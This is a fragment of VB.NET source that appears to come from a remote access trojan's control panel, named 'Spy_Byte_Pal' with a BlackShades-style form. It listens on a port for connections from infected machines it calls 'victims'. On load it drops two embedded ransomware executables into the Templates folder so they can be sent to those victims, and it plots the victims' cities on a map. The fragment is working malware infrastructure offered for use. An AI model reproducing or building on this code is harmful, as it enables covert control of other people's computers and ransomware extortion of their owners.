                    Process.Start(Application.StartupPath & "\VictimsFolder\" + Victimname + L1.FocusedItem.SubItems(1).Text)
                End If
            End Try
        End If
        ' For Each Path As String In IO.Directory.GetDirectories(Application.StartupPath & "\VictimsFolder\")
        '  MsgBox(Path)
        ' Next
    End Sub

    Private Sub Main_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        '  Dim myBitmap As Bitmap
        'myBitmap = CType(My.Resources.Armi, Bitmap)
        ' MsgBox(myBitmap.GetPixel(0, 0).ToString)
        '   Me.TransparencyKey = Color.FromArgb(33, 33, 33)
      
        Try
            CheckForIllegalCrossThreadCalls = False
            S = New KX
            Dim port = InputBox("Listen to Port", "Spy_Byte_Pal", 6740)

            RAT_Port = port
            S.Start(Integer.Parse(port))
            Me.BlackShadesNetForm1.Text &= "            Listening on port : " & port


        Catch ex As Exception

        End Try
        'Build auto Ransomware in a Dir to run to Victims
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "vbsransom[Don`t_Run].exe", My.Resources.vbs)
        File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "sblransom[Don`t_Run].exe", My.Resources.saher_blue_eagle)

        L1.BackgroundImage = My.Resources.Armi
    End Sub

    Private Sub TabPage2_Enter(sender As System.Object, e As System.EventArgs) Handles TabPage2.Enter
        'MapPlotter(country)
        Timer1.Start()
      
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        For Each victim As ListViewItem In L1.Items
            Dim city As String = victim.SubItems(4).Text
            MapPlotter(city)
        Next
        '    Timer1.Stop()
    End Sub

    Function getstartpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint

    End Function
    Function getendpoint(ByVal x, ByVal y) As Point
        Dim newpoint As New Point
        newpoint.X = x
        newpoint.Y = y
        Return newpoint
    End Function
    Public Sub DrawLineFloat(ByVal startpoint As Point, ByVal endpoint As Point)
        ' Create pen. 
        Dim blackPen As New Pen(Color.Blue, 3)
        ' Create coordinates of points that define line. 
        Dim x1 As Single = startpoint.X
        Dim y1 As Single = startpoint.Y
        Dim x2 As Single = endpoint.X
        Dim y2 As Single = endpoint.Y
        ' Draw line to screen. 

        Dim g As Graphics = map.CreateGraphics()
        g.DrawLine(blackPen, x1, y1, x2, y2)

        blackPen.Dispose()

    End Sub

    Private Sub Hacker_Tick(sender As System.Object, e As System.EventArgs) Handles Hacker.Tick
        hackercoord(ratcountry)
    End Sub
    Sub hackercoord(ByVal City As String)
        On Error Resume Next
        Dim x As String = ""
        Dim database As New RichTextBox
        database.Text = My.Resources.countryinfo
        For Each line In database.Lines
            If line.Contains(City) Then
                x = line.Replace(City & "|", "")
                Dim coords() As String = x.Split(",")
                '      mapcoords(coords(0), coords(1))
                country = City
                pic2(coords(0), coords(1))
                hackerpic(coords(0), coords(1))
            End If
        Next
    End Sub
    Sub hackerpic(ByVal latitude As Double, ByVal longitude As Double)
        Dim pbwidth As Double = map.Width
        Dim pbheight As Double = map.Height
        Dim longratio As Double = pbwidth / 360
        Dim latratio As Double = pbheight / 180
        Dim latcord As Double = 90 - latitude
        Dim longcord As Double = (180 + longitude)
        latcord = latratio * latcord
        longcord = longratio * longcord
        Dim g As Graphics = map.CreateGraphics
        Dim flag As Image = My.Resources.Icons_Land_Vista_Hardware_Devices_Home_Server.ToBitmap
        g.DrawImage(flag, CInt(longcord) - 1, CInt(latcord) - 1, 25, 30)
    End Sub
End Class